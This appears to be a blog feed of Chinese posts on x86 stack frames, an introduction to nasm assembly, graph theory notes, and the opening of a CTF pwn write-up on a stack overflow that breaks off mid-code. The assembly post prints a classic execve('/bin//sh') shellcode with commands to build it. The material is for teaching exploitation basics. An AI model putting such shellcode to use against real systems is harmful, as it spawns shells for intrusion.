    <content type="html"><![CDATA[<h1 id="汇编中的栈和函数">汇编中的栈和函数</h1><h2 id="linux可执行文件装载过程">linux可执行文件装载过程</h2><p><strong>程序文件</strong>不等于<strong>进程</strong>。当一个程序运行时，操作系统会先把程序文件从<strong>磁盘</strong>中映射到<strong>内存中</strong>。程序文件中的段会被对应的映射到内存中对应的段（比如程序文件中的<code>.text</code> 段映射到内存中的 <code>.text</code>段）。这个过程中有对应的规则，在现在的x86架构的linux中，每个进程都有一个独立的虚拟内存空间，大小为<code>4GB</code>，操作系统会将该进程用到的内存再次映射到物理内存，所以针对一个进程，我们只需关注其进程空间的内存分布即可，操作系统会帮我们管理物理内存。</p><figure><img src="1732614202384.png" alt="进程空间内存布局" /><figcaption aria-hidden="true">进程空间内存布局</figcaption></figure><p>其中，读写段和只读段都是有程序文件本身映射到内存中得到的，而剩下的部分则是随着程序的运行，由进程创建的。我们调试时看到的内存就是进程空间中的内存，在<code>pwndbg</code> 中，你可以用 <code>vmmap</code>查看程序内存布局和权限情况（读写执行权限）。</p><h2 id="函数栈帧">函数栈帧</h2><p>我们想要在一个函数中调用另一个函数，但每个函数都会用到相同的寄存器比如<code>esp</code> <code>ebp</code> <code>eax</code> <code>eip</code>等等，我们如何在调用时保存上一个函数的状态呢？我们需要一种<code>FILO</code>（先进后出）的数据结构（因为先调用的函数最后恢复状态），就是栈。</p><p>在一个进程中，所有的函数都共用一个栈，即上图中的用户栈，正在调用的函数越多，栈越大。其中一个函数在栈上保存信息的那部分栈，叫做该函数的<strong>栈帧</strong>。</p><p><code>esp</code>叫栈顶寄存器，总是指向当前函数栈帧的<strong>栈顶</strong>；<code>ebp</code>叫栈基址寄存器，总是指向当前函数栈帧的<strong>栈底</strong>。当然，由上面的图可知，栈顶在地址上总是比栈底要小的，即<strong>栈向低地址方向增长</strong>。</p><figure><img src="1732631521210.png" alt="栈帧结构图" /><figcaption aria-hidden="true">栈帧结构图</figcaption></figure><p>上图中 <code>esp</code> <code>ebp</code>指向的地址即为当前这两个寄存器的值。</p><h2 id="函数的序幕与尾声">函数的序幕与尾声</h2><p>先复习一下这几条指令：</p><ul><li><code>push</code>可以接一个立即数或一个寄存器操作数，将一个值压入栈中。 例：<code>push eax</code> 等效于 <code>sub esp,4; mov [esp],eax</code></li><li><code>pop</code> 接一个寄存器，将栈中的值弹入寄存器中。例：<code>pop eax</code> 等效于<code>mov eax,[esp]; add esp,4</code></li><li><code>leave</code> 不接任何东西，在一个函数结束的时候调用。例：<code>leave</code> 等效于 <code>mov esp,ebp; pop ebp</code></li><li><code>call</code> 调用一个函数，后面接一个地址（或者说是标签）。例：<code>call printf</code> 等效于<code>push eip; jmp printf</code></li><li><code>ret</code> 从一个函数中返回到原来的执行位置，什么也不接。例：<code>ret</code> 等效于 <code>pop eip</code></li></ul><p>若你用反汇编工具观察过几个C语言程序，你会发现几乎每个函数都有这样的开头和结尾：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nasm">push ebp<br>mov ebp,esp<br>sub esp,40h     ;这里的立即数取决于函数的局部变量<br>;   ...<br>leave<br>ret<br></code></pre></td></tr></table></figure><p>这几条指令都与栈帧的管理有关。此外，用于调用函数的 <code>call</code>也与函数的栈帧有关。</p><p>下面我们以图示的形式演示x86架构linux系统程序<em>函数的序幕与尾声</em> （上面那段代码）干了什么，对栈有什么改变。</p><p>函数调用之前，应该已经存在这样的结构：</p><p><img src="1732627643474.png" /></p><p>这里的<strong>参数1</strong>、<strong>参数2</strong>等是即将被调用的函数的参数，他们在该函数被调用之前就已经被<strong>倒序</strong>压入栈中（通过<code>push</code>指令）。<code>ebp</code>现在还指向上一个函数的栈底。</p><p>当调用该函数时，即执行 <code>call func</code>指令时，函数的<strong>返回地址</strong>被压入栈中。这个地址指导着：当被调用函数结束后，主函数（调用者）应该执行哪条指令（因为此时<code>eip</code> 早已改变）。</p><p><img src="1732627637653.png" /></p><p>当进入该函数时，即执行 <code>push ebp</code> 时，原来函数的<code>ebp</code> 值被压入栈中，这是为了该函数调用结束后 <code>ebp</code>能恢复到原来的值。栈的结构如下：</p><p><img src="1732630571387.png" /></p><p>接着是一个 <code>mov ebp,esp</code> 指令，将 <code>ebp</code>的值改为栈顶地址，目的是以当前栈顶为基址，开辟一个新的栈帧。</p><p><img src="1732631527508.png" /></p><p>然后 <code>sub esp,40h</code> ，这里开辟了一个 <code>0x40</code>字节大小的栈空间，用来储存当前函数的局部变量。</p><p><img src="1732631521210.png" /></p><p>在函数内部执行完一些操作后，我们开始进入 <em>函数的尾声</em> 。</p><p><code>leave</code> 指令相当于 <code>mov esp,ebp; pop ebp</code>，即将栈顶移至栈帧基址处，相当于销毁栈帧，再将原来储存在栈中的<code>ebp</code> 的旧值（主函数的栈帧基址）恢复到 <code>ebp</code>寄存器中。</p><p><img src="1732627637653.png" /></p><p>最后，<code>ret</code> 指令，即相当于 <code>pop eip</code>，将函数的返回地址弹出到指令寄存器中，下一步将执行主函数被调用前的下一条指令，栈的布局恢复到函数被调用前：</p><p><img src="1732627643474.png" /></p><p>至于栈中的<strong>参数1</strong>、<strong>参数2</strong>等，则由主函数在调用前压入栈中。当然，如果是x64架构的linux，前六个参数用寄存器传参，分别为<code>rdi</code> <code>rsi</code> <code>rdx</code> <code>rcx</code><code>r8</code> <code>r9</code>，剩余的参数则还由栈传递，即会被先压入栈中。（这也是为什么x64栈溢出会用到<strong>ROP</strong>技术，可以自行查询）</p><p>最后附上一张各种状态下栈帧结构图</p><p><img src="1732631535651.png" /></p>]]></content>
    
    
    <categories>
      
      <category>binary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>binary</tag>
      
      <tag>pwn</tag>
      
      <tag>ctf</tag>
      
      <tag>asm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编简介</title>
    <link href="/2024/12/05/binary-2024-introduction-to-asm/"/>
    <url>/2024/12/05/binary-2024-introduction-to-asm/</url>
    
    <content type="html"><![CDATA[<h2 id="基本概念">基本概念</h2><p><strong>指令</strong>：即控制cpu的指令，相当于一个或一串对cpu有意义的字节。不同设计的cpu会有不同的指令架构（这与硬件有关）。</p><p><strong>机器码</strong>：cpu能直接执行的一个或一串字节。</p><p><strong>汇编语言</strong>：是机器码的助记符。</p><p><strong>寄存器</strong>：在cpu中的、可以快速访问的少量存储器。</p><p>不同的cpu有不同的指令集，对应的汇编语言也有不同的语法，使用的寄存器也不同。（比如intel的x86、x64架构，ARMv8架构，mips架构，在接下来的课程中，我们着重于x86、x64架构的汇编讲解）</p><p>同一架构下汇编语言的语法也可能有所不同，比如x64有AT&amp;T语法、intel风格语法。此外，不同编译器之间也有一些较小的差异，比如masm和nasm。</p><p>下面给出上面四个概念的对应例子：</p><p><strong>intel</strong>语法风格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nasm">push rbp    ; 0x55<br>nop         ; 0x90<br></code></pre></td></tr></table></figure><p>上面的汇编语言片段中，<code>push rbp</code>是一条汇编指令，它对应的机器码是 <code>0x55</code> ，它的含义是将<code>rbp</code> 寄存器中的值压入栈中。</p><p><strong>AT&amp;T</strong>语法风格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembler">pushq %rbp<br>nop<br></code></pre></td></tr></table></figure><p>基于方便的理由，我们这节课暂且以nasm编译器、intel风格语法为例编写汇编程序。</p><h2 id="nasm编译器的安装和使用">nasm编译器的安装和使用</h2><ul><li><p>ubuntu:</p><p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install nasm<br></code></pre></td></tr></table></figure></p></li><li><p>windows:</p><p><ahref="https://www.nasm.us/pub/nasm/releasebuilds/2.16.03/win64/">官网下载地址</a></p><p>下载后添加到系统PATH环境变量</p></li></ul><p>检查 ： <code>nasm --version</code></p><p>新建一个文件 <code>hello.asm</code> ，输入如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nasm">; Intel 格式<br>; Hello.asm<br>section .data           ; 数据段声明<br>          msg db &quot;Hello World!&quot;,0xA   ; 要输出的字符串<br>          len equ $ -msg              ; 字符串长度<br>section .text                         ; 代码段声明<br>global _start                         ; 指定入口函数<br>_start:                               ; 在屏幕上显示一个字符串<br>          mov edx, len                ; 参数三：字符串长度<br>          mov ecx, msg                ; 参数二：要显示的字符串<br>          mov ebx, 1                  ; 参数一：文件描述符（stdout）<br>          mov eax, 4                  ; 系统调用号（sys_write）<br>          int 0x80                    ; 调用内核功能<br>                                      ; 退出程序<br>          mov ebx, 1                  ; 参数一：退出代码<br>          mov eax, 1                  ; 系统调用号（sys_exit）<br>          int 0x80                    ; 调用内核功能<br></code></pre></td></tr></table></figure><p>保存退出后，在终端输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nasm -f elf64 helloworld.asm -o hello.o<br>ld hello.o -o hello<br></code></pre></td></tr></table></figure><p>即可生成可执行文件 <code>hello</code>，执行它，将会打印一条helloworld</p><h2 id="认识寄存器">认识寄存器</h2><p>在x86架构中，寄存器通常分为以下几类： - 通用寄存器 - 标志寄存器 -指令寄存器 - 段寄存器 - ...</p><p>（还有一些寄存器目前涉及不到，上面几个是现阶段逆向最常用的）</p><p>至于x64架构，只是将上面一些寄存器进行了拓展。</p><h3 id="通用寄存器">通用寄存器</h3><p>x86系统通用寄存器有如下几个：</p><ul><li>eax 通常是和函数的返回值</li><li>ebx 一般用来做数据存取</li><li>ecx 通常用来作为计数器</li><li>edx 乘除运算的默认操作数，也可以用作IO端口</li><li>edi 通常与字符串操作有关</li><li>esi 通常与字符串操作有关</li><li>esp 栈顶寄存器</li><li>ebp 栈基址寄存器</li></ul><p>当然，上面所述都是其常用功能，即高级语言编译器的用法，这几个寄存器也可以做另外用途，自己写汇编的时候不一定遵守其通常行为。</p><p>上述这些寄存器储存大小都是32位，即4字节。若想访问其低16位，可以把前面的e 去掉，比如 <code>ax</code> <code>si</code> 等等。</p><p>针对x64架构，这些寄存器全部由 r 打头，如 <code>rax</code>，储存空间变为64位。另外，x64还新增了8个通用寄存器，即<code>r8-r15</code></p><table><thead><tr><th>64</th><th>低32</th><th>低16</th><th>低8</th></tr></thead><tbody><tr><td>rax</td><td>eax</td><td>ax</td><td>al</td></tr><tr><td>rbx</td><td>ebx</td><td>bx</td><td>bl</td></tr><tr><td>rcx</td><td>ecx</td><td>cx</td><td>cl</td></tr><tr><td>rdx</td><td>edx</td><td>dx</td><td>dl</td></tr><tr><td>rsi</td><td>esi</td><td>si</td><td>sil</td></tr><tr><td>rdi</td><td>edi</td><td>di</td><td>dil</td></tr><tr><td>rbp</td><td>ebp</td><td>bp</td><td>bpl</td></tr><tr><td>rsp</td><td>esp</td><td>sp</td><td>spl</td></tr><tr><td>r8</td><td>r8d</td><td>r8w</td><td>r8b</td></tr><tr><td>r9</td><td>r9d</td><td>r9w</td><td>r9b</td></tr><tr><td>r10</td><td>r10d</td><td>r10w</td><td>r10b</td></tr><tr><td>r11</td><td>r11d</td><td>r11w</td><td>r11b</td></tr><tr><td>r12</td><td>r12d</td><td>r12w</td><td>r12b</td></tr><tr><td>r13</td><td>r13d</td><td>r13w</td><td>r13b</td></tr><tr><td>r14</td><td>r14d</td><td>r14w</td><td>r14b</td></tr><tr><td>r15</td><td>r15d</td><td>r15w</td><td>r15b</td></tr></tbody></table><p><code>ax-dx</code> 可访问其高八位为 <code>ah-dh</code></p><h3 id="标志位寄存器">标志位寄存器</h3><p>这个寄存器中有很多标志位，用于储存cpu执行指令的一些状态。</p><figure><img src="659280-20201021092122855-1111960429.png"alt="标志位寄存器各个标志位" /><figcaption aria-hidden="true">标志位寄存器各个标志位</figcaption></figure><h3 id="指令寄存器">指令寄存器</h3><p>x86下指令寄存器叫 <code>eip</code> ，x64下叫 <code>rip</code>，他们存放着cpu下一条指令所存放的地址，pwn中劫持程序控制流本质上就是修改指令寄存器到期望的地址而完成的。</p><h3 id="段寄存器">段寄存器</h3><p>x86和x64架构都有如下几个段寄存器，它们都是16位的</p><ul><li>cs 代码段</li><li>ds 数据段</li><li>ss 栈段</li><li>es 拓展段</li><li>fs 数据段</li><li>gs 数据段</li></ul><p>段寄存器的知识略显复杂，尤其在x86和x64的保护模式下，暂且不论。有兴趣的同学可以参考<ahref="https://www.cnblogs.com/xuanyuan/p/13850548.html">一口气看完45个寄存器，CPU核心技术大揭秘</a></p><h2 id="认识一些常见的指令">认识一些常见的指令</h2><h3 id="mov">mov</h3><p>我们先来根据上面 <code>helloworld.asm</code> 程序来讲解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nasm">_start:                               <br>        mov edx, len                <br>        mov ecx, msg                <br>        mov ebx, 1                  <br>        mov eax, 4                  <br>        int 0x80                    <br><br>        mov ebx, 1                  <br>        mov eax, 1                   <br>        int 0x80                    <br></code></pre></td></tr></table></figure><p>首先是 <code>mov</code> 指令，格式为 <code>mov a,b</code>，用c语言类比则是 <code>a=b;</code>。在intel风格的语法中（也就是现在我们展示的语法），<code>a</code>叫做<strong>目的操作数</strong> ，<code>b</code>叫做<strong>源操作数</strong>。目的操作数和源操作数有一定的规则，以下语法允许的：</p><table><thead><tr><th>源操作数 <code>b</code></th><th>目的操作数 <code>a</code></th></tr></thead><tbody><tr><td>立即数</td><td>寄存器</td></tr><tr><td>立即数</td><td>内存</td></tr><tr><td>寄存器</td><td>寄存器</td></tr><tr><td>寄存器</td><td>内存</td></tr><tr><td>内存</td><td>寄存器</td></tr></tbody></table><p>注：在intel风格语法中，目的操作数在前，源操作数在后；在AT&amp;T语法中，目的操作数在后，源操作数在前。</p><p><strong>立即数</strong>：cpu将指令的一部分解释成数据，这部分数据称为立即数。比如说<code>mov ebx, 1</code> 中的 <code>1</code> 即为立即数。如果你查看<code>mov ebx, 1</code>的机器码（<code>bb 01 00 00 00</code>），你会发现这部分数据确实是存在于指令中的。</p><p>在这里，你可能会对上面的机器码有所疑问，在这里先做解答：</p><ul><li>为什么1是四字节？因为ebx是四字节的寄存器。</li><li>为什么1是倒序的？因为遵循小端序储存。小端序是指一个整数储存在内存中时，其低位（偏小的位）对应低地址，高位对应高地址。上面指令中<code>bb</code> 端是低地址方向，所以 <code>1</code>储存在低地址方向。</li><li>为什么是<code>01</code>而不是<code>10</code>？因为显示的时候以一个字节为单位进行显示，事实上其二进制应为<code>1000 0000</code></li></ul><p>那么<strong>内存</strong>是怎么体现的？</p><p>在nasm语法中，<code>[...]</code> 用以表示取 <code>...</code>的值作为地址，该地址中的值，<code>...</code>是一个有效表达式。比如<code>mov eax,[ebx]</code> 约等于c语言中的 <code>eax=*ebx</code>，相当于 <code>ebx</code> 是一个指针。下面举出一些例子供大家体会：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nasm">mov eax,[ebx*2+ecx+2]<br>mov eax,[ebx*5]<br>;下面使用了标签<br>mov ebx,[label1+label2*2]<br></code></pre></td></tr></table></figure><p><strong>标签</strong>：在nasm语法中，你可以在数据声明或指令前面写一个<strong>标签</strong>，你在编程中可以引用这个标签，这等价于引用此处指令或声明的地址。</p><p>例如 <code>helloworld.asm</code> 中，<code>msg</code> 和<code>_start</code>都是标签。标签可以加冒号，也可以不加冒号。标签会在数据引用和跳转上带来极大的便利。</p><p><strong>常量</strong></p><p><em><code>equ</code> 定义一个符号，代表一个常量值：当使用<code>equ</code> 时，源文件行上必须包含一个label。 <code>equ</code>的行为就是把给出的label的名字定义成它的操作数(唯一)的值。该定义是不可更改的。</em></p><p>上述 <code>helloworld.asm</code> 中的 <code>len</code>就是一个例子。它相当于在编译期间将所有 <code>len</code>都换成一个立即数。</p><h3 id="int-0x80">int 0x80</h3><p>经过上面的学习，你应该已经了解了 <code>_start</code>标签下面4行汇编指令的意思，接着的指令是<code>int 0x80</code>。它向系统发出 <code>0x80</code>的<strong>软中断</strong>指令，使系统进入<strong>内核态</strong>，并根据一些<strong>通用寄存器</strong>中的值进行<strong>系统调用</strong>。你可以理解为调用操作系统（linux）的函数。</p><p>进行系统调用时，<code>eax</code>储存的是<strong>系统调用号</strong>，并分别由 <code>ebx</code>、<code>ecx</code> 、<code>edx</code> 、<code>esi</code>、<code>edi</code>传递第1-5个参数。<strong>系统调用号</strong>决定了调用系统哪个函数。</p><p>在本例中，前面一段的系统调用号是 <code>4</code> ，写成c语言是<code>write(stdout,msg,len);</code> ，而下面一段则是<code>exit(0);</code> 。</p><p><ahref="https://blog.csdn.net/Nashi_Ko/article/details/120288385">LinuxX86架构 32 64系统调用表</a></p><h3 id="针对-helloworld.asm-的其他东西">针对 <code>helloworld.asm</code>的其他东西</h3><h4 id="section">section</h4><p><code>section</code>是一个伪指令，用于表示声明一个段，如数据段、代码段、bss段等，这与<strong>程序运行时内存分布</strong>相对应。</p><h4 id="global">global</h4><p><code>global</code> 也是一个伪代码，表示导出符号到其他模块。</p><h4 id="数据声明">数据声明</h4><p>在声明以初始化的数据的时候，<code>db</code> <code>dw</code><code>dd</code> <code>dq</code>分别代表以1、2、4、8个字节为单位，前面需要加上一个标签，相当于指针。</p><p>相对的，声明未初始化数据的时候（声明在bss段） ，使用<code>resb</code> <code>resw</code> <code>resd</code><code>resq</code>，后面加上以前面声明类型为单位的数据量，比如<code>label1 resb 64</code> （声明一个64字节的未初始化变量）。</p><h4 id="与">$与$$</h4><p>$表示从它所在源代码行在编译后的起始地址，$$表示从当前段的起始地址。</p><p>所以 <code>$-msg</code> 表达的是当前源码地址减去 <code>msg</code>起始地址，即得到 <code>msg</code> 字符串长度</p><h3 id="lea">lea</h3><p><code>lea</code> 指令用于加载有效地址，用法如下：</p><ul><li><code>lea eax,[401080h]</code> 将一个地址 <code>401080h</code> 写入<code>eax</code></li><li><code>lea eax,dword [ebx]</code> 将储存了地址的 <code>ebx</code>中的值写入 <code>eax</code></li><li><code>lea eax, [ebx+ecx*4+8]</code> 计算 <code>ebx+ecx*4+8</code>的地址并写入 <code>eax</code></li></ul><p>在x64架构中也同理。</p><h3 id="算数指令逻辑指令">算数指令、逻辑指令</h3><p>我们只先提及下面会用到的，其他指令建议自学了解。</p><ul><li><code>add a,b</code> 相当于 <code>a=a+b</code> ，其中 <code>a</code>可以是一个寄存器或内存地址，<code>b</code>可以是一个立即数、寄存器或内存地址。</li><li><code>sub a,b</code> 相减，与上面同理。</li></ul><p><ahref="https://blog.csdn.net/weixin_40179091/article/details/131768536">asm:常见指令大全</a></p><h3 id="栈与函数">栈与函数</h3><p>这里的<strong>栈</strong>指的是程序运行时的栈，它由栈基址寄存器<code>ebp</code> 和栈顶寄存器 <code>esp</code> 来管理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">00:0000│ rsp  0x7fffffffd640 ◂— 0x55460000000000<br>01:0008│      0x7fffffffd648 ◂— 0x85ddfd55f4464e00<br>02:0010│ rbp  0x7fffffffd650 ◂— 0x1<br>03:0018│      0x7fffffffd658 —▸ 0x7ffff7dd9d68 (__libc_start_call_main+120) ◂— mov edi, eax<br>04:0020│      0x7fffffffd660 —▸ 0x7fffffffd750 —▸ 0x7fffffffd758 ◂— 0x38 /* &#x27;8&#x27; */<br>05:0028│      0x7fffffffd668 —▸ 0x5555555551e6 (main) ◂— endbr64<br>06:0030│      0x7fffffffd670 ◂— 0x155554040<br></code></pre></td></tr></table></figure><p>这是一个64位程序main函数的栈（使用插件pwndbg）</p><ul><li><code>push</code>可以接一个立即数或一个寄存器操作数，将一个值压入栈中。 例：<code>push eax</code> 等效于 <code>sub esp,4; mov [esp],eax</code></li><li><code>pop</code> 接一个寄存器，将栈中的值弹入寄存器中。例：<code>pop eax</code> 等效于<code>mov eax,[esp]; add esp,4</code></li><li><code>leave</code> 不接任何东西，在一个函数结束的时候调用。例：<code>leave</code> 等效于 <code>mov esp,ebp; pop ebp</code></li><li><code>call</code> 调用一个函数，后面接一个地址（或者说是标签）。例：<code>call printf</code> 等效于<code>push eip; jmp printf</code></li><li><code>ret</code> 从一个函数中返回到原来的执行位置，什么也不接。例：<code>ret</code> 等效于 <code>pop eip</code></li></ul><p>可以通过上节课的 <code>overflow32</code> 程序逆向了解栈帧。</p><p>另，下面是一段经典的x86的shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nasm">section .text<br>global _start<br>_start:<br>    xor    eax,eax<br>    push   eax<br>    push   0x68732f2f<br>    push   0x6e69622f<br>    mov    ebx,esp<br>    mov    ecx,eax<br>    mov    edx,eax<br>    mov    al,0xb<br>    int    0x80<br>    xor    eax,eax<br>    inc    eax<br>    int    0x80<br></code></pre></td></tr></table></figure><p>编译链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nasm -f elf32 shellcode.asm -o shellcode.o<br>ld shellcode.o -o shellcode -m elf_i386<br></code></pre></td></tr></table></figure><h3 id="比较与跳转">比较与跳转</h3><p><ahref="https://blog.csdn.net/zmmycsdn/article/details/78511948">汇编跳转指令:JMP、JECXZ、JA、JB、JG、JL、JE、JZ、JS、JC、JO、JP 等</a></p><p><ahref="https://blog.csdn.net/WolvenSec/article/details/139244132">汇编：比较&amp;跳转</a></p>]]></content>
    
    
    <categories>
      
      <category>binary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>binary</tag>
      
      <tag>pwn</tag>
      
      <tag>ctf</tag>
      
      <tag>asm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>离散数学——图论总结归纳</title>
    <link href="/2024/05/30/discrete-mathematics-graph-theory/"/>
    <url>/2024/05/30/discrete-mathematics-graph-theory/</url>
    
    <content type="html"><![CDATA[<h1 id="图论">图论</h1><h2 id="图的基本概念">图的基本概念</h2><h3 id="图的集合表示">图的集合表示</h3><p>图的表示 <span class="math inline">\(G(V,E)\)</span> ，其中 <spanclass="math inline">\(V\)</span> 为顶点集， <spanclass="math inline">\(E\)</span>为边集，都为有限集.边集可以使有向边集，也可以是无向边集.</p><p><span class="math inline">\(V(G)\)</span>，<spanclass="math inline">\(E(G)\)</span> 表示图 <spanclass="math inline">\(G\)</span> 的顶点集和边集.</p><p>有序边的表示方法为 <span class="math inline">\(e_i\)</span> 或者<span class="math inline">\(&lt;v_i,v_j&gt;\)</span>，无序边的表示方法为 <span class="math inline">\(e_i\)</span> 或 <spanclass="math inline">\((v_i,v_j)\)</span>.</p><h3 id="其他一些基本概念">其他一些基本概念</h3><ul><li>阶：顶点数，有 <span class="math inline">\(n\)</span> 个顶点即为<span class="math inline">\(n\)</span> 阶图.</li><li>零图：一条边也没有的图.<span class="math inline">\(n\)</span>阶零图记为 <spanclass="math inline">\(N_n\)</span>.一阶零图称为<strong>平凡图</strong></li><li>空图：在运算中产生 <span class="math inline">\(V\)</span>为空的情况，记为 <span class="math inline">\(\varnothing\)</span>.</li><li>基图：有向图变无向图称它的基图</li><li>环：<ul><li>无向图中，<span class="math inline">\(e_k=(v_i,v_j)\)</span> ，称<span class="math inline">\(e_k\)</span> 与 <spanclass="math inline">\(v_i\)</span>（或 <spanclass="math inline">\(v_j\)</span> ）关联；若 <spanclass="math inline">\(v_i=v_j\)</span> 则关联次数为 <spanclass="math inline">\(2\)</span> ，否则为 <spanclass="math inline">\(1\)</span>. 不关联则为 <spanclass="math inline">\(0\)</span>.</li><li>有向图中，有始终点之分.</li><li>在两种图中，有 <span class="math inline">\(v_i=v_j\)</span> 则称<span class="math inline">\(e_k\)</span> 为<strong>环</strong>.</li></ul></li><li>相邻：点有边连接，边有点连接，称这两个点（边）相邻.</li><li><strong>简单图</strong>：既不含平行边，也不含环的图，称为简单图.含平行边的为多重图.<ul><li>在无向图，平行边只需要同连接两个顶点；在有向图中，平行边需要<strong>方向相同</strong>.</li><li>平行边的条数称为重数. <pre><code class=" mermaid">graph LRsubgraph 不是平行边direction LRa((v1))b((v2))a--&gt;bb--&gt;aendsubgraph 是平行边direction LRc((v1))d((v2))c--&gt;dc--&gt;dend不是平行边 &lt;---&gt; 是平行边</code></pre></li></ul></li><li>度：记 <span class="math inline">\(G\)</span> 为无向图， <spanclass="math inline">\(D\)</span> 为有向图. 则 <spanclass="math inline">\(v\)</span> 作为端点的次数为度数，记为 <spanclass="math inline">\(d_G(v)\)</span>. 有向图中分出度和入度，分别记为<span class="math inline">\(d_D^+(v)\)</span> 和 <spanclass="math inline">\(d_D^-(v)\)</span>. （<em>出为 <spanclass="math inline">\(+\)</span> ，入为 <spanclass="math inline">\(-\)</span> ，正好与电磁学中的通量相反</em>）<ul><li>最大度：<span class="math inline">\(\Delta (G)\)</span> ，<spanclass="math inline">\(\Delta (D)\)</span></li><li>最小度：<span class="math inline">\(\delta (G)\)</span> ，<spanclass="math inline">\(\delta (D)\)</span></li><li>最大/小出度：<span class="math inline">\(\Delta ^+(D)\)</span>，<span class="math inline">\(\delta ^+ (D)\)</span></li><li>最大/小入度：<span class="math inline">\(\Delta ^-(D)\)</span>，<span class="math inline">\(\delta ^- (D)\)</span></li></ul></li><li>悬挂顶点：度数为 <spanclass="math inline">\(1\)</span>，与之关联的边为悬挂边.</li><li>奇度顶点/偶度顶点：无需解释.</li><li>握手定理</li><li>同构（<span class="math inline">\(\cong\)</span>）</li><li>彼得松图</li><li>完全图：<span class="math inline">\(G\)</span> 为 <spanclass="math inline">\(n\)</span> 阶无向简单图，每个顶点都与其余 <spanclass="math inline">\(n-1\)</span> 个顶点相连，则 <spanclass="math inline">\(G\)</span> 为 <spanclass="math inline">\(n\)</span> 阶（无向）完全图，记为 <spanclass="math inline">\(K_n\)</span>；若为有向图，则为 <spanclass="math inline">\(n\)</span> 阶有向完全图.</li><li><span class="math inline">\(n\)</span> 阶竞赛图：<spanclass="math inline">\(n\)</span> 阶有向简单图 <spanclass="math inline">\(D\)</span> 的基图为 <spanclass="math inline">\(n\)</span>阶无向完全图 <spanclass="math inline">\(K_n\)</span> ，则称 <spanclass="math inline">\(D\)</span> 为 <spanclass="math inline">\(n\)</span> 阶竞赛图.</li><li><span class="math inline">\(k-\)</span>正则图：<spanclass="math inline">\(G\)</span> 为 <spanclass="math inline">\(n\)</span> 阶无向简单图，那么 <spanclass="math inline">\(\forall v \in V(G), d(v)=k\)</span> .</li><li>子图、母图、真子图、生成子图：对应子集、原集、真子集、点集相等的子集.</li></ul>]]></content>
    
    
    <categories>
      
      <category>数理基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>离散数学</tag>
      
      <tag>数学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Guessing Game 1</title>
    <link href="/2024/04/18/ucas-ctf-pwn-guessing-name-1/"/>
    <url>/2024/04/18/ucas-ctf-pwn-guessing-name-1/</url>
    
    <content type="html"><![CDATA[<h1 id="guessing-game-1">Guessing Game 1</h1><p>关于 <code>mprotect</code> 函数的应用（其实完全可以用系统调用）</p><span id="more"></span><h2 id="x01-常规看看">0x01 常规看看</h2><p>题目给了三个文件，通过makefile可知程序是静态编译</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">[*] <span class="hljs-string">&#x27;/home/kali/ctf/pwn/q36_guessing_game_1/vuln&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found <br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure><p>事实上这次checksec有些不准，应没有canary</p><p>没开启栈保护</p><p>读源码发现存在栈溢出漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 